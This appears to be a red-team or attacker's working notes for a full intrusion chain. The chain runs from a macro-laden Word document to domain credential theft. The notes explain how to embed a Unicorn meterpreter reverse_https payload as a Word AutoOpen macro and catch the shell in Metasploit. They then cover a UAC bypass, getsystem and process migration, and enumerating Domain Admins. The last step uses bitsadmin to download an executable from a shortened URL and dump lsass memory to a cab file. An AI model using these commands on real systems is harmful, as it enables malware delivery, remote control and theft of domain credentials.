---------
cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs"  /dstatus
---------
Setup Microsoft Word

- Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
- Click Developer | Macros
- Open Word / Developer / Macros / Create / Auto_Open / insert payload from Unicorn
- Macro Security - Enable all macros
- Save as a Word Macro-Enabled Document

https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
-------
Description of behaviors of Auto-Exec and Auto-Open macros in Word

AutoOpen in Word
https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
If you are deploying this against Office365/2016+ versions of Word you need 
to modify the first line of the output from: Sub Auto_Open()                                                       
                                                                                                                   
To: Sub AutoOpen()                                                                                                 
                                                                                                                   
The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. 
-------

Create a Email MSG shortcut for the following;

"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "No Account" "C:\Users\domainuser\Desktop\email.msg"
"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"

---------
[UPDATE METASPL0IT]
sudo passwd root
su - 
curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb && chmod 755 msfinstall && ./msfinstall
---------
[Install Unicorn]

git clone https://github.com/trustedsec/unicorn
chmod +x unicorn
python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
---------
sudo msfconsole -r unicorn.rc
---------

Copy maro powershell_attack.txt into Word attachment. 

sudo mv powershell_attack.txt /home/powershell_attack.txt
scp kali@10.3.99.1:/home/powershell.txt 

---------

sessions -i 1
load priv stdapi extapi

getuid
getsystem
background 
use windows/local/bypassuac_sluihijack
set SESSION 1
exploit
getuid
getsystem

---------
execute -H -c -f "C:\\windows\\sysnative\\notepad.exe"
migrate 7584
shell
---------

whoami
ping -m 1 8.8.8.8
net1 group "Domain Admins" /domain

# downloads pd64.exe ProcessDump"
bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C:\Users\Public\1.exe
cd C:\Users\Public\
C:\Users\Public\1.exe -accepteula -ma lsass.exe lsass.dmp
makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
